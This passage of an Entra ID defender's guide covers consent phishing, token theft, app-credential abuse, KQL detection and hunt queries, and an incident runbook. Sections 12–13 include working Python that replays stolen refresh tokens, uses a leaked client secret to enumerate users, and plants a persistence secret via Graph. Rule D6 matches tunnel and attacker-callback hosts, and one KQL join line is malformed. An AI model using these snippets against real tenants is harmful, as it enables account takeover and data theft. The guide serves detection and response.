| where OperationName == "Consent to application"
| extend ModifiedProps = TargetResources[0].modifiedProperties
| mv-expand ModifiedProps
| where tostring(ModifiedProps.displayName) == "ConsentContext.IsAdminConsent"
| where tostring(ModifiedProps.newValue) =~ "True"
| extend ActorUPN = tostring(InitiatedBy.user.userPrincipalName)
| extend AppName = tostring(TargetResources[0].displayName)
| project TimeGenerated, ActorUPN, AppName
```

In a healthy tenant this should fire at most a few times per quarter, all to apps you recognize and approved. Anything else is an incident.

### Side note: catching the click before consent — `UrlClickEvents`

Everything above fires *after* the user has authenticated and granted consent. Defenders with Microsoft Defender for Office 365 (and Safe Links enabled) have access to a much earlier signal: the user clicking the phishing link in the first place. This is technically a Defender XDR concern, not Entra — but it slots into the same investigation timeline so cleanly that it'd be wrong not to mention it.

When Safe Links is enabled, every URL click from email, Teams, or Office apps is logged in the `UrlClickEvents` table in Microsoft Defender XDR's advanced hunting. If your consent-phishing email got past the spam/phish filters, this table is where you find out *who clicked the link* — usually minutes before the consent grant lands in `AuditLogs`.

The schema, condensed to what matters for this attack:

| Column | What it tells you |
|---|---|
| `Timestamp` | When the user clicked |
| `AccountUpn` | UPN that clicked |
| `Url` | The URL that was clicked (post-Safe-Links wrapping) |
| `UrlChain` | Full redirect chain — phishing kits often bounce through 2–4 redirects |
| `ActionType` | `ClickAllowed`, `ClickBlocked`, `UrlScanInProgress`, or `UrlErrorPage` |
| `IsClickedThrough` | Did the user click *past* a Safe Links warning page (1) or not (0) — high-signal field |
| `ThreatTypes` | Verdict at click time: `Phish`, `Malware`, etc. (may be empty if no verdict yet) |
| `Workload` | `Email`, `Office`, or `Teams` — where the click originated |
| `NetworkMessageId` | Joins to `EmailEvents` to recover the original email |
| `IPAddress` | User's IP at click time (email clicks only — not yet populated for Teams/Office clicks) |

Two query patterns matter for OAuth-phishing investigation specifically:

**1. Users who clicked links to `login.microsoftonline.com` with suspicious query parameters.** Consent-phishing URLs look like real Microsoft URLs (because they go to the real Microsoft `/authorize` endpoint with an attacker `client_id`):

```kql
UrlClickEvents
| where Timestamp > ago(7d)
| where Url has "login.microsoftonline.com" and Url has "/oauth2/v2.0/authorize"
| extend ParsedUrl = parse_url(Url)
| extend QueryParams = tostring(ParsedUrl.["Query Parameters"])
| extend ClientId = extract(@"client_id=([a-f0-9\-]+)", 1, QueryParams)
| extend Scope = extract(@"scope=([^&]+)", 1, QueryParams)
| extend RedirectUri = url_decode(extract(@"redirect_uri=([^&]+)", 1, QueryParams))
| project Timestamp, AccountUpn, Workload, ClientId, Scope, RedirectUri, ActionType, IsClickedThrough
| where Scope has_any ("Mail.Read", "Files.Read", "offline_access", "Directory.Read")
   or RedirectUri !has "microsoft" and RedirectUri !has "office" 
| sort by Timestamp desc
```

A non-Microsoft `redirect_uri` on a `login.microsoftonline.com` `/authorize` URL is the hard fingerprint of OAuth phishing. The `client_id` in the URL is the attacker's app — pivot from there to `AuditLogs` to find the resulting consent grant.

**2. Stitching the click to the consent grant.** When you find a suspicious consent in `AuditLogs`, you usually want to know *how* it happened. Was it from an email? Did the user click through a Safe Links warning? `UrlClickEvents` joined on UPN + tight time window answers that:

```kql
let suspicious_consents = AuditLogs
| where TimeGenerated > ago(24h)
| where OperationName == "Consent to application"
| extend Initiator = tostring(InitiatedBy.user.userPrincipalName)
| extend AppName = tostring(TargetResources[0].displayName)
| project ConsentTime = TimeGenerated, Initiator, AppName;
suspicious_consents
| join kind=inner (
    UrlClickEvents
    | where Timestamp > ago(24h)
    | where Url has "login.microsoftonline.com"
) on $left.Initiator == $right.AccountUpn
| where ClickTime = Timestamp, ClickTime between (ConsentTime - 30m .. ConsentTime + 5m)
| project ClickTime, ConsentTime, AccountUpn = Initiator, AppName, Url, 
          ActionType, IsClickedThrough, NetworkMessageId, ThreatTypes
```

That timeline — *click on phishing URL → consent grant in Entra* within minutes — is the smoking gun, and `NetworkMessageId` from the click row joins to `EmailEvents` to pull the original phishing email out of mail flow:

```kql
EmailEvents
| where NetworkMessageId == "<id-from-UrlClickEvents>"
| project Timestamp, SenderFromAddress, SenderIPv4, RecipientEmailAddress, 
          Subject, DeliveryAction, ThreatTypes, AttachmentCount, UrlCount
```

Now you have the full chain: sender, subject, attachments, when the user clicked, whether they clicked through a warning, what `client_id` they consented to, and what scopes were granted. That's the IR ticket writing itself.

**Caveats worth knowing.**

- `UrlClickEvents` requires Defender for Office 365 with Safe Links enabled. Without that license/feature, the table is empty.
- Safe Links wraps URLs at click-time; if the user clicks a link the user-agent already cached from an earlier read, the wrapper might bypass — coverage is good but not 100%.
- Microsoft is still expanding which clicks get full metadata. `IPAddress` is currently email-only; Teams and Office click IPs are intermittent. `AccountUpn` was missing from a subset of Office clicks at GA and was being filled in over subsequent quarters.
- For clicks from Drafts and Sent items, the `NetworkMessageId` is system-generated and doesn't join to `EmailEvents`. This matters for internal phishing investigations.
- This table is in Microsoft Defender XDR's advanced hunting (in `security.microsoft.com`), not in Sentinel by default. To use these queries from Sentinel you need either the M365 Defender connector enabled or to run them in the Defender portal directly.

The point of all this: **the click happens before the consent**, sometimes by minutes, sometimes by an hour if the user reads the email and comes back to it. Building the click signal into your OAuth phishing detection — alongside `Consent to application` audit events — gives you an earlier alert and forensic evidence of how the user got there. Many OAuth phishing investigations stall at "we know they consented, we don't know why" — `UrlClickEvents` fills that gap.

### Mitigations

The high-leverage controls, in order of impact:

1. **Set user consent to verified-publisher-only.** Entra → Enterprise applications → Consent and permissions → "Allow user consent for apps from verified publishers, for selected permissions." Verified publisher status requires Microsoft Partner Network membership and identity verification, raising the attacker bar significantly.
2. **Enable the admin consent workflow.** Users can request consent; admin reviews. Without this, restricting consent just makes users frustrated.
3. **App governance** (Defender for Cloud Apps add-on). Monitors OAuth apps and can auto-revoke based on policy.
4. **Detection** (KQL above) wired to your SIEM with severity tied to scope sensitivity.
5. **Periodic review** of granted consents via Entra access reviews.

---

## 12. Token theft attacks

Attacker doesn't need the user to consent to anything — they steal a token already issued to a legitimate app. Three main flavors:

### Adversary-in-the-Middle (AiTM) phishing

Tools like Evilginx run a reverse proxy between victim and `login.microsoftonline.com`. User sees the real Microsoft sign-in page, types real credentials, completes real MFA. The proxy captures the session cookie / authorization code. Attacker uses it to mint tokens.

**Detection signals:**
- Sign-in from an unusual IP/ASN immediately after a sign-in from the user's normal location, same session ID
- Token refresh activity from a different IP/ASN than the original sign-in
- `AuthenticationDetails` showing all factors satisfied but from a residential proxy ASN

```kql
SigninLogs
| where TimeGenerated > ago(7d)
| where ResultType == 0
| extend ASN = tostring(parse_json(tostring(AutonomousSystemNumber)))
| summarize 
    SignInTimes = make_list(TimeGenerated, 100),
    IPs = make_set(IpAddress, 50),
    ASNs = make_set(NetworkLocationDetails, 50)
    by UserPrincipalName, bin(TimeGenerated, 1h)
| where array_length(IPs) > 2
| sort by TimeGenerated desc
```

### Primary Refresh Token (PRT) theft

Attacker who has code execution on a domain-joined or Entra-joined Windows device extracts the PRT from LSASS (or via Mimikatz/Rubeus equivalents). The PRT can mint tokens for any app the user is entitled to, anywhere — survives password reset, MFA, sometimes even device wipe if extracted before.

**Detection signals:**
- `IncomingTokenType == "primaryRefreshToken"` from an IP that doesn't match the device's usual network
- New device registrations with the same `deviceId` from a different physical environment
- `AuthenticationProcessingDetails` showing inconsistent device telemetry

This is hard to detect from logs alone — endpoint EDR is the primary defense. Treat PRT theft as endpoint compromise + identity compromise simultaneously.

### Browser session cookie theft

Stealer malware (RedLine, Lumma, etc.) extracts session cookies from browser stores. Attacker imports them into their own browser and gets the user's authenticated session.

### What "using a stolen token" actually looks like

Once any of the three attacks above produces a refresh token, the attacker doesn't need to repeat the attack — they just hit `/token` on a schedule. This is the entire post-compromise primitive:

```python
# Attacker has a refresh token from AiTM, PRT theft, or OAuth phishing.
# Mints fresh access tokens against any resource the user has consented to.

def mint_access_token_for(resource_scope):
    return requests.post(
        "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token",
        data={
            "client_id": ORIGINAL_CLIENT_ID,    # whatever app the RT was issued to
            "grant_type": "refresh_token",
            "refresh_token": stolen_rt,
            "scope": resource_scope,
        },
    ).json()

# Pivot: use the same RT to mint tokens for many resources
mail   = mint_access_token_for("https://graph.microsoft.com/Mail.Read")
files  = mint_access_token_for("https://graph.microsoft.com/Files.Read.All")
arm    = mint_access_token_for("https://management.azure.com/.default")
sharepoint = mint_access_token_for("https://contoso.sharepoint.com/.default")
```

For the defender: each of those `mint_access_token_for` calls is **one row** in `AADNonInteractiveUserSignInLogs`, with `IncomingTokenType: "primaryRefreshToken"` or `"refreshToken"`, the same `AppId`, but a *different* `ResourceDisplayName` per call. This is the fingerprint of post-compromise activity — one RT, many resources, often within minutes.

The hunt query that catches it most reliably is "RT redeeming for a resource the user/app has never used before" (see H4 in §11). The IP on these rows is the **attacker's** — the user is asleep. This is why correlating IP across `SigninLogs` (the original interactive sign-in, user's IP) and `AADNonInteractiveUserSignInLogs` (subsequent RT redemptions, possibly attacker's IP) is so high-signal.

**Mitigations across all three:**

- **Phishing-resistant MFA** (FIDO2/WebAuthn, certificate-based auth, Windows Hello for Business) — defeats AiTM because the auth is bound to the origin.
- **Token Protection** (Conditional Access session control) — binds tokens to the device. If the cookie/token leaves the device, it stops working.
- **Continuous Access Evaluation** — when device compliance changes or risk goes high, tokens revoke fast.
- **Sign-in risk policies** — Identity Protection flags impossible travel, anonymous IP, etc.

---

## 13. Service principal and app credential abuse

App credentials (secrets, certificates) get leaked. App owners get phished. Consented apps get abused. The attack chain typically looks like:

1. Attacker obtains app credentials (secret in a public repo, exfiltrated cert, phished app owner).
2. Attacker authenticates as the app via client credentials flow.
3. Attacker uses the app's pre-consented permissions — often Mail.Read, Files.Read.All, Directory.Read.All — to exfiltrate.

### What the abuse looks like on the wire

The "use" step is trivial — same `/token` call any legitimate daemon makes. Whether it's the rightful owner or an attacker is invisible to the protocol; the only difference is *where the credential came from*.

```python
# Attacker found a client secret in a leaked .env file, GitHub history, or CI log
LEAKED_CLIENT_ID = "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"
LEAKED_SECRET    = "the-secret-that-shouldnt-have-been-in-source-control"

# Authenticate as the app from anywhere on the internet
resp = requests.post(
    "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token",
    data={
        "client_id": LEAKED_CLIENT_ID,
        "client_secret": LEAKED_SECRET,
        "grant_type": "client_credentials",
        "scope": "https://graph.microsoft.com/.default",
    },
).json()

# Now the attacker has whatever the app was pre-consented to — often
# tenant-wide app permissions like Mail.Read, User.Read.All, etc.
graph = requests.get(
    "https://graph.microsoft.com/v1.0/users",
    headers={"Authorization": f"Bearer {resp['access_token']}"},
).json()
# tenant directory enumeration in two HTTP calls.
```

This is the call that produces the `AADServicePrincipalSignInLogs` row with `Authentication credential used: ClientSecret`. Defender's signal: the IP, ASN, and time pattern of this call versus the daemon's normal infrastructure.

The **persistence** variant — attacker who briefly has Application Administrator or Global Admin adds a *new* secret to an existing privileged app, then keeps using it after the compromised admin account is locked out:

```python
# Attacker, holding a Graph token from a compromised admin, calls the Graph API
# to add a fresh secret to a high-privilege app
victim_app_object_id = "11112222-3333-4444-5555-666677778888"

new_cred = requests.post(
    f"https://graph.microsoft.com/v1.0/applications/{victim_app_object_id}/addPassword",
    headers={"Authorization": f"Bearer {compromised_admin_token}"},
    json={
        "passwordCredential": {
            "displayName": "totally-legitimate-rotation-2026",
            "endDateTime": "2027-12-31T00:00:00Z",
        }
    },
).json()

attacker_secret = new_cred["secretText"]
attacker_app_id = ...  # the appId of the victim app, from Graph

# From now on, attacker authenticates as the victim app from their own infra.
# Even when the original admin password is reset and sessions revoked,
# this credential survives — it's a property of the app, not the user.
resp = requests.post(
    "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token",
    data={
        "client_id": attacker_app_id,
        "client_secret": attacker_secret,
        "grant_type": "client_credentials",
        "scope": "https://graph.microsoft.com/.default",
    },
).json()
```

This is the attack the D1 detection (newly-added app credentials) is designed to catch. The Graph call to `/addPassword` produces the audit log row; the subsequent client-credentials token request produces a sign-in log row with a fresh `servicePrincipalCredentialKeyId` you've never seen before. Joining the two on appId + time window is the high-fidelity finding.

### Detection: new credentials added to existing apps

This is one of the loudest persistence signals:

```kql
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName in (
    "Update application – Certificates and secrets management ",  // trailing space is intentional
    "Update application",
    "Update service principal"
  )
| mv-expand TargetResources
| extend ModifiedProps = TargetResources.modifiedProperties
| mv-expand ModifiedProps
| where tostring(ModifiedProps.displayName) in ("KeyDescription", "PasswordCredentials")
| extend ActorUPN = tostring(InitiatedBy.user.userPrincipalName)
| extend AppName = tostring(TargetResources.displayName)
| project TimeGenerated, ActorUPN, AppName, NewValue = tostring(ModifiedProps.newValue)
| sort by TimeGenerated desc
```

If an attacker compromises a Global Admin briefly, the persistence move is to add a credential to a high-privilege app rather than create a new one — quieter and survives the user's password reset. This query catches it.

### Detection: service principal sign-in from a new IP/country

```kql
let baseline =
    AADServicePrincipalSignInLogs
    | where TimeGenerated between (ago(30d) .. ago(1d))
    | summarize KnownCountries = make_set(LocationDetails.countryOrRegion, 20) by AppId;
AADServicePrincipalSignInLogs
| where TimeGenerated > ago(1d)
| where ResultType == 0
| extend Country = tostring(LocationDetails.countryOrRegion)
| join kind=leftouter baseline on AppId
| where Country !in (KnownCountries) and isnotempty(Country)
| project TimeGenerated, ServicePrincipalName, AppId, Country, IPAddress, ResourceDisplayName
```

A daemon that's run from your Azure region for a year suddenly authenticating from a residential IP in a country you don't operate in is, frankly, easy to catch — if you're looking.

### Credential type drift

Apps that *should* be using certificates but log entries show client secrets (or vice versa) is a useful signal:

```kql
AADServicePrincipalSignInLogs
| where TimeGenerated > ago(7d)
| extend ProcDetails = parse_json(AuthenticationProcessingDetails)
| mv-expand ProcDetails
| where tostring(ProcDetails.key) == "Authentication credential used"
| extend CredType = tostring(ProcDetails.value)
| summarize CredTypes = make_set(CredType), Count = count() by AppId, ServicePrincipalName
| where array_length(CredTypes) > 1
```

Apps using multiple credential types over time are either rotating (fine, expected during cert rollover) or compromised (someone added a secret to an app you'd hardened to certs only).

### Mitigations

- **Move all confidential clients off secrets onto certificates or federated credentials.** Secrets in env files, tickets, and CI logs are the #1 leakage vector.
- **Use Azure Key Vault** to hold and rotate certs.
- **Workload Identity Federation** for CI/CD (GitHub Actions, AKS, GitLab) — the credential is a short-lived token from the external IdP, no secret to leak.
- **Audit `servicePrincipalCredentialKeyId`** in the sign-in logs — it tells you which credential each sign-in actually used. If you see an unfamiliar `keyId`, someone added it.

---

## 14. Detection rule library

A practical starter set. Tune thresholds to your tenant.

### D1 — Device code flow phishing

```kql
SigninLogs
| where TimeGenerated > ago(1h)
| where AuthenticationProtocol == "deviceCode"
| where ResultType == 0
| project TimeGenerated, UserPrincipalName, AppDisplayName, IPAddress, Location
```

In most tenants, device code flow is rare. Page on every success that isn't from a known automation account.

### D2 — ROPC sign-ins

```kql
SigninLogs
| where TimeGenerated > ago(1h)
| where AuthenticationProtocol == "ropc"
| project TimeGenerated, UserPrincipalName, AppDisplayName, AppId, ResultType
```

Every hit is a ticket. ROPC bypasses MFA — apps using it should be migrated or blocked.

### D3 — Impossible travel (without Identity Protection)

```kql
SigninLogs
| where TimeGenerated > ago(1d)
| where ResultType == 0
| extend Country = tostring(LocationDetails.countryOrRegion)
| summarize Countries = make_set(Country, 10), SigninTimes = make_list(TimeGenerated) by UserPrincipalName, bin(TimeGenerated, 1h)
| where array_length(Countries) >= 2
```

If you have Entra ID P2, use Identity Protection's `RiskyUsers` and `RiskDetections` tables instead — they account for VPNs, known proxies, and travel patterns.

### D4 — High-privilege role assigned

```kql
AuditLogs
| where TimeGenerated > ago(1h)
| where OperationName in ("Add member to role", "Add eligible member to role")
| extend RoleName = tostring(parse_json(tostring(TargetResources[0].modifiedProperties))[1].newValue)
| where RoleName has_any (
    "Global Administrator", "Privileged Role Administrator", 
    "Privileged Authentication Administrator", "Application Administrator", 
    "Cloud Application Administrator", "User Administrator", 
    "Exchange Administrator", "SharePoint Administrator")
| extend ActorUPN = tostring(InitiatedBy.user.userPrincipalName)
| extend TargetUser = tostring(TargetResources[2].userPrincipalName)
| project TimeGenerated, ActorUPN, TargetUser, RoleName
```

Page on every Global Admin assignment that isn't part of a documented change.

### D5 — User added to a privileged group

Same idea but for groups that confer privilege via PIM or Conditional Access exclusions:

```kql
AuditLogs
| where OperationName == "Add member to group"
| extend GroupName = tostring(TargetResources[0].displayName)
| where GroupName in ("Break-Glass-Accounts", "Tier0-Admins", "<your-privileged-groups>")
```

### D6 — App registration with risky redirect URI

```kql
AuditLogs
| where OperationName == "Add application"
| extend AppName = tostring(TargetResources[0].displayName)
| extend ModProps = TargetResources[0].modifiedProperties
| mv-expand ModProps
| where tostring(ModProps.displayName) == "ReplyUrls"
| extend ReplyUrls = tostring(ModProps.newValue)
| where ReplyUrls has_any ("ngrok", "localhost.run", "trycloudflare", "serveo", "burpcollaborator")
   or ReplyUrls matches regex @"https?://[a-z0-9\-]+\.(tk|ml|ga|cf|gq|xyz|top|click)/"
```

Ngrok-style tunnels and dodgy TLDs in reply URLs of new apps are red flags.

### D7 — Conditional Access policy modified

```kql
AuditLogs
| where TimeGenerated > ago(1h)
| where Category == "Policy"
| where OperationName has "conditional access"
| extend ActorUPN = tostring(InitiatedBy.user.userPrincipalName)
| extend PolicyName = tostring(TargetResources[0].displayName)
| project TimeGenerated, OperationName, ActorUPN, PolicyName
```

CA policy changes are an attacker's "make sure my access doesn't get blocked" move. Page on disabling or weakening of any policy.

### D8 — Disabled MFA / removed authentication method

```kql
AuditLogs
| where TimeGenerated > ago(1d)
| where OperationName in (
    "Disable Strong Authentication",
    "User registered all required security info",
    "Admin updated security info",
    "Reset user password",
    "Update user")
| extend ActorUPN = tostring(InitiatedBy.user.userPrincipalName)
| extend TargetUser = tostring(TargetResources[0].userPrincipalName)
| where ActorUPN != TargetUser  // someone changed someone else's auth
| project TimeGenerated, OperationName, ActorUPN, TargetUser
```

Helpdesk social engineering — calling support to "I lost my phone, please remove MFA" — is a top initial-access vector. Catch it here.

### D9 — Successful sign-in after multiple failures (password spray response)

```kql
SigninLogs
| where TimeGenerated > ago(1d)
| summarize 
    Failures = countif(ResultType != 0),
    Successes = countif(ResultType == 0),
    UniqueIPs = dcount(IPAddress)
    by UserPrincipalName, bin(TimeGenerated, 1h)
| where Failures > 5 and Successes > 0
```

### D10 — Sign-in from anonymous IP (Tor, known VPN)

If you have Identity Protection:

```kql
AADRiskDetection
| where TimeGenerated > ago(1d)
| where RiskEventType in ("anonymousIPAddress", "maliciousIPAddress", "torIPAddress")
| project TimeGenerated, UserPrincipalName, RiskEventType, IPAddress
```

If you don't, maintain your own IP threat list and join against `SigninLogs.IpAddress`.

---

## 15. Hunt queries

For threat hunting (high false-positive rate, manual review).

### H1 — Newly-consented apps that immediately accessed mail

Find apps that got mailbox-read consent and then started reading lots of mail soon after:

```kql
let consents =
    AuditLogs
    | where TimeGenerated > ago(7d)
    | where OperationName == "Consent to application"
    | extend AppId = tostring(TargetResources[0].id)
    | extend Permissions = tostring(parse_json(tostring(TargetResources[0].modifiedProperties))[0].newValue)
    | where Permissions has "Mail.Read"
    | project ConsentTime = TimeGenerated, AppId, Permissions, ConsenterUPN = tostring(InitiatedBy.user.userPrincipalName);
AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(7d)
| where ResourceDisplayName has "Exchange" or ResourceDisplayName == "Microsoft Graph"
| join kind=inner consents on AppId
| where TimeGenerated between (ConsentTime .. (ConsentTime + 24h))
| summarize TokenIssuances = count(), Users = dcount(UserPrincipalName) by AppId, ConsentTime
| where TokenIssuances > 5
```

### H2 — Users with unusual app inventory

Each user has a typical set of apps they sign into. Outliers are interesting:

```kql
let baseline =
    SigninLogs
    | where TimeGenerated between (ago(30d) .. ago(7d))
    | summarize KnownApps = make_set(AppDisplayName, 50) by UserPrincipalName;
SigninLogs
| where TimeGenerated > ago(7d)
| where ResultType == 0
| join kind=inner baseline on UserPrincipalName
| where AppDisplayName !in (KnownApps)
| summarize NewApps = make_set(AppDisplayName, 20) by UserPrincipalName
| where array_length(NewApps) > 0
```

### H3 — Service principals with sign-ins to surprising resources

```kql
let baseline =
    AADServicePrincipalSignInLogs
    | where TimeGenerated between (ago(30d) .. ago(7d))
    | summarize KnownResources = make_set(ResourceDisplayName, 20) by AppId;
AADServicePrincipalSignInLogs
| where TimeGenerated > ago(7d)
| where ResultType == 0
| join kind=inner baseline on AppId
| where ResourceDisplayName !in (KnownResources)
| project TimeGenerated, ServicePrincipalName, AppId, ResourceDisplayName, IPAddress
```

### H4 — Refresh token redemptions across geographically distant IPs

Token replay from a stolen RT often shows as the same RT being redeemed from two cities in a short window:

```kql
AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(1d)
| where IncomingTokenType in ("refreshToken", "primaryRefreshToken")
| where ResultType == 0
| extend Country = tostring(LocationDetails.countryOrRegion)
| summarize 
    Countries = make_set(Country, 10),
    IPs = make_set(IPAddress, 20),
    Tokens = count()
    by UserPrincipalName, bin(TimeGenerated, 1h)
| where array_length(Countries) >= 2
```

### H5 — Apps that have never been used but have high-privilege consents

Stale apps with sensitive scopes are persistence vectors waiting to be used:

```kql
let appUsage =
    union AADNonInteractiveUserSignInLogs, SigninLogs
    | where TimeGenerated > ago(90d)
    | summarize LastSeen = max(TimeGenerated) by AppId;
AuditLogs
| where TimeGenerated > ago(365d)
| where OperationName == "Consent to application"
| extend AppId = tostring(TargetResources[0].id)
| extend Permissions = tostring(parse_json(tostring(TargetResources[0].modifiedProperties))[0].newValue)
| where Permissions has_any ("Mail.ReadWrite", "Files.ReadWrite.All", "Directory.ReadWrite.All", "Application.ReadWrite.All")
| join kind=leftouter appUsage on AppId
| where isnull(LastSeen)
| project AppId, ConsentTime = TimeGenerated, Permissions
```

---

## 16. Conditional Access as a defender's tool

CA isn't just an access policy — it's a detection enabler and a containment tool. The minimum policy set every tenant should have:

| Policy | Purpose |
|---|---|
| **Block legacy authentication** | Eliminates POP/IMAP/SMTP basic auth. Closes ROPC and most password-spray vectors. |
| **Require MFA for all users** | Baseline. Exclude only break-glass accounts. |
| **Require MFA for admins** | Stricter — phishing-resistant only, no SMS. |
| **Block sign-in from unsupported countries** | If you don't operate in country X, block country X. |
| **Require compliant or hybrid-joined device for Azure management** | Can only manage Azure from your endpoints. |
| **Block device code flow** (with exceptions) | Phishing reduction. |
| **Sign-in risk policy: Block high risk** | Identity Protection integration. |
| **User risk policy: Require password change on high risk** | Same. |
| **Token Protection for sign-in sessions** | Binds tokens to device — kills cookie/token theft. |
| **Session: sign-in frequency for sensitive apps** | Reduces stale-session risk. |

Two break-glass accounts excluded from every policy, with hardware keys, alerts on every sign-in, monitored quarterly. Document them.

### CA bypass detection

CA can be bypassed by combinations the policy author didn't think of: a user not in any group the policy targets, an app excluded from the policy, a flow not covered by the policy. Hunt for `ConditionalAccessStatus == "notApplied"` on sensitive resources:

```kql
SigninLogs
| where TimeGenerated > ago(1d)
| where ConditionalAccessStatus == "notApplied"
| where ResourceDisplayName in (
    "Microsoft Graph", 
    "Windows Azure Service Management API", 
    "Office 365 Exchange Online", 
    "Office 365 SharePoint Online")
| where ResultType == 0
| summarize Count = count() by UserPrincipalName, ResourceDisplayName, AppDisplayName
| sort by Count desc
```

`notApplied` on critical resources means *no policy matched*. Sometimes legitimate (service accounts excluded for a reason), often a gap.

---

## 17. Incident response runbooks

### IR-1: Suspected OAuth phishing / illicit consent grant

The investigative goal in the first 10 minutes: **a complete timeline from inbound email → click → consent → app activity**. Most OAuth phishing runbooks start at the consent grant. That's a mistake — you skip past the evidence that explains *how* it happened, who else got the email, and whether more users are mid-click. Lead with the click stitch.

#### Phase 1 — reconstruct the timeline (5–10 min)

1. **Stitch click to consent.** This is your first query, before pulling sign-in logs:

    ```kql
    let suspect_consents = AuditLogs
    | where TimeGenerated > ago(7d)
    | where OperationName == "Consent to application"
    | extend Initiator = tostring(InitiatedBy.user.userPrincipalName)
    | extend AppId = tostring(TargetResources[0].id)
    | extend AppName = tostring(TargetResources[0].displayName)
    | extend ModProps = TargetResources[0].modifiedProperties
    | mv-expand ModProps
    | where tostring(ModProps.displayName) == "ConsentAction.Permissions"
    | extend Permissions = tostring(ModProps.newValue)
    | project ConsentTime = TimeGenerated, Initiator, AppId, AppName, Permissions;
    suspect_consents
    | join kind=leftouter (
        UrlClickEvents
        | where Timestamp > ago(7d)
        | where Url has "login.microsoftonline.com"
    ) on $left.Initiator == $right.AccountUpn
    | where Timestamp between (ConsentTime - 1h .. ConsentTime + 5m)
    | project ClickTime = Timestamp, ConsentTime, AccountUpn = Initiator, AppName, AppId,
              Permissions, Url, ActionType, IsClickedThrough, NetworkMessageId, 
              ThreatTypes, Workload
    | sort by ConsentTime desc
    ```

    Output is the full attack chain. If the join returns rows: you have the email-side evidence. If it returns null on the click side: the consent didn't come from email Safe Links — likely a Teams message, a non-email vector, or an organization without Defender for Office 365.

2. **Pull the source email.** From the rows above, take `NetworkMessageId` and join to `EmailEvents`:

    ```kql
    EmailEvents
    | where NetworkMessageId in ('<id1>', '<id2>')
    | project Timestamp, SenderFromAddress, SenderIPv4, SenderMailFromAddress,
              RecipientEmailAddress, Subject, DeliveryAction, DeliveryLocation,
              ThreatTypes, AttachmentCount, UrlCount, AuthenticationDetails
    ```

    `AuthenticationDetails` tells you SPF/DKIM/DMARC status — useful for figuring out if the sender domain was spoofed or actually owned by the attacker.

3. **Find every recipient who got the same campaign.** The phish probably hit more than one user. Pivot on `SenderFromAddress` and a tight time window:

    ```kql
    EmailEvents
    | where Timestamp > ago(7d)
    | where SenderFromAddress == "<sender-from-step-2>"
    | project Timestamp, RecipientEmailAddress, Subject, DeliveryAction, NetworkMessageId
    | distinct RecipientEmailAddress, NetworkMessageId, Subject
    ```

    Then run all those `NetworkMessageId`s back through `UrlClickEvents` to see who else clicked — and back through `AuditLogs` for `Consent to application` to see who else consented. The blast radius isn't just the one user who triggered the alert.

4. **Identify the attacker's app.** From the consent row: `AppId` (the attacker's client_id) and `ServicePrincipalId` (the SP that was created in your tenant when consent was granted). Note the `AppOwnerOrganizationId` of the service principal — that's the tenant the attacker registered the app in:

    ```kql
    AADServicePrincipalSignInLogs
    | where AppId == "<attacker-app-id>"
    | take 1
    | project AppId, ServicePrincipalId, AppOwnerTenantId
    ```

    If `AppOwnerTenantId` is a tenant created in the last few weeks and the SP shows up in your `AuditLogs` "Add service principal" event from the same time window as the consent, that's the textbook pattern.

#### Phase 2 — contain (parallel with phase 3)

5. **Block the app.** Entra → Enterprise applications → [app] → Properties → "Enabled for users to sign in" → No. This stops new sign-ins to the app immediately but does *not* invalidate existing tokens.

6. **Revoke all consents.** Same blade → Permissions → Revoke admin consent (if any) and per-user consents. For all users found in step 3 who consented.

7. **Revoke active sessions for affected users.** For each user from step 3:

    ```powershell
    Revoke-MgUserSignInSession -UserId <upn>
    ```

    This invalidates refresh tokens. **It does not kill access tokens already issued** — those expire naturally (≤1 hour for non-CAE, up to 28h for CAE-eligible apps). Plan accordingly: the attacker may still have ~1h of access after revocation if the app already minted access tokens.

8. **Quarantine the source emails.** Defender → Threat Explorer → submit the `NetworkMessageId`s for soft delete or hard delete (depending on your policy). Use ZAP (Zero-hour Auto Purge) if available. This removes them from inboxes that haven't been read yet.

#### Phase 3 — assess what the attacker did (parallel with phase 2)

9. **Hunt the malicious app's activity.** From consent time to revocation, what did the attacker actually do with the tokens? Pivot on the attacker's `AppId`:

    ```kql
    AADNonInteractiveUserSignInLogs
    | where TimeGenerated between (datetime(<consent-time>) .. now())
    | where AppId == "<attacker-app-id>"
    | project TimeGenerated, UserPrincipalName, ResourceDisplayName, IPAddress, 
              IncomingTokenType, ConditionalAccessStatus
    ```

    Each row is the attacker minting an access token for a resource. `ResourceDisplayName` tells you what was targeted — Graph (likely mailbox/files/directory), Exchange Online, SharePoint, etc.

10. **Pull resource-side activity.** For each resource the attacker got tokens for:
    - **Microsoft Graph**: `MicrosoftGraphActivityLogs` for the affected users, filtered to the time window. This is the most granular view — every Graph call the app made.
    - **Exchange Online**: `Search-UnifiedAuditLog -UserIds <upn> -Operations MailItemsAccessed,Send,New-InboxRule,Update-InboxRule,MoveToDeletedItems`.
    - **SharePoint/OneDrive**: UAL `FileAccessed`, `FileDownloaded`, `FileSyncDownloadedFull`, `FileModified`, `SharingSet`.

11. **Use Linkable Token Identifiers (§19) where available.** From the malicious app's sign-in rows, the `SessionId` and `UniqueTokenIdentifier` let you scope workload-side audit to *exactly* the attacker's token usage rather than the user's broader activity. This is the single fastest way to separate attacker actions from legitimate user actions in a busy mailbox or SharePoint site.

12. **Look for persistence and lateral movement.** Did the attacker:
    - Create an inbox rule on the user's mailbox? (Forward-to-external, move-to-deleted, mark-as-read for replies — classic AiTM/OAuth-phishing persistence patterns.)
    - Send mail *as the user* (internal phishing to harvest more victims)?
    - Add documents with macros to OneDrive/SharePoint?
    - Modify shared documents to plant payloads?
    - Scrape contacts/org chart for next-round targeting?

#### Phase 4 — close out

13. **Notify affected users.** They consented to a malicious app. Tell them what was accessed and what to do (change passwords for any external services they accessed during the window, watch for further phishing, etc.).

14. **Block the app tenant-wide** if it's multi-tenant. Add the `AppId` to your blocklist. Submit to Microsoft for takedown if it's still live in other tenants.

15. **Update controls.** Did this get past your "verified publisher only" consent restriction (per §11 mitigations)? If the user was able to consent at all, the policy isn't tight enough — re-evaluate. Did Safe Links fail to flag the URL? Submit it for review and check Safe Links policy coverage.

16. **Phishing simulation follow-up.** OAuth consent simulations are a category most awareness platforms now support. Run one against the affected user's team and broader org over the next 30 days.

---

